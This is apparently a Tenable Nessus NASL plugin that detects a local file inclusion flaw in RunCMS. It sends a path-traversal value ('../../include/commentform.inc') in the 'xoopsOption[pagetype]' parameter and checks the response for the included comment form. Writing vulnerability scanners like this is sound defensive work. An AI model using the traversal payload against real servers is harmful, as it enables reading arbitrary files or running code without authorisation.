#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(28291);
  script_version("1.15");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/06/01");
  script_bugtraq_id(26562);
  script_xref(name:"EDB-ID", value:"4656");

  script_name(english:"RunCMS xoopsOption Parameter Local File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to a local file include attack.");
  script_set_attribute(attribute:"description", value:
"The version of RunCMS installed on the remote host fails to sanitize
user input to the 'xoopsOption[pagetype]' parameter before using it to
include PHP code in 'include/common.php'.  Regardless of PHP's
'register_globals' setting, an unauthenticated, remote attacker may be
able to exploit this issue to view arbitrary files or to execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user id.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2007/11/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2022 Tenable Network Security, Inc.");

  script_dependencies("runcms_detect.nasl");
  script_require_keys("www/runcms");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/runcms"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to retrieve a local file.
  file = "../../include/commentform.inc";
  r = http_send_recv3(method:"GET", 
    item:string(
      dir, "/modules/news/index.php?",
      "xoopsOption[pagetype]=", file
    ), 
    port:port );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we see the comment form before the regular page.
  if ("<!DOCTYPE" >< res) inc = res - strstr(res, "<!DOCTYPE");
  else inc = res - strstr(res, "<html");
  if ("/postcomment.php' method='post'" >< inc)
  {
    security_warning(port);
    exit(0);
  }
}
